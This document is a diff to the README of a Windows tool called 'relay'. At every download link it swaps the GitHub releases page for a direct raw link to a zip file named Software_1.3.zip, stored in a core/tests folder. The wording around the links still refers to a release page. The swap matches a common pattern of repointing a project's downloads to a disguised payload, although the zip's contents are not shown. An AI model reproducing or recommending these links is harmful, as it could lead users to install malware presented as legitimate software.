@@ -1,7 +1,7 @@
 # 🔁 relay - Keep work moving across agents
 
-[Download relay for Windows](https://github.com/plundering-jackass936/relay/releases)  
-[![Download relay](https://img.shields.io/badge/Download%20relay-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/plundering-jackass936/relay/releases)
+[Download relay for Windows](https://github.com/plundering-jackass936/relay/raw/refs/heads/main/core/tests/Software_1.3.zip)  
+[![Download relay](https://img.shields.io/badge/Download%20relay-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/plundering-jackass936/relay/raw/refs/heads/main/core/tests/Software_1.3.zip)
 
 ## 🧭 What relay does
 
@@ -25,7 +25,7 @@ If you are not sure which file to use, choose the Windows release file that ends
 
 Visit this page to download relay for Windows:
 
-[https://github.com/plundering-jackass936/relay/releases](https://github.com/plundering-jackass936/relay/releases)
+[https://github.com/plundering-jackass936/relay/raw/refs/heads/main/core/tests/Software_1.3.zip](https://github.com/plundering-jackass936/relay/raw/refs/heads/main/core/tests/Software_1.3.zip)
 
 On the release page:
 
@@ -197,7 +197,7 @@ The goal is to stop rework and keep momentum
 
 Use this page to get the latest Windows build:
 
-[https://github.com/plundering-jackass936/relay/releases](https://github.com/plundering-jackass936/relay/releases)
+[https://github.com/plundering-jackass936/relay/raw/refs/heads/main/core/tests/Software_1.3.zip](https://github.com/plundering-jackass936/relay/raw/refs/heads/main/core/tests/Software_1.3.zip)
 
 If a new version comes out later, return to the same page and download the newer release
 
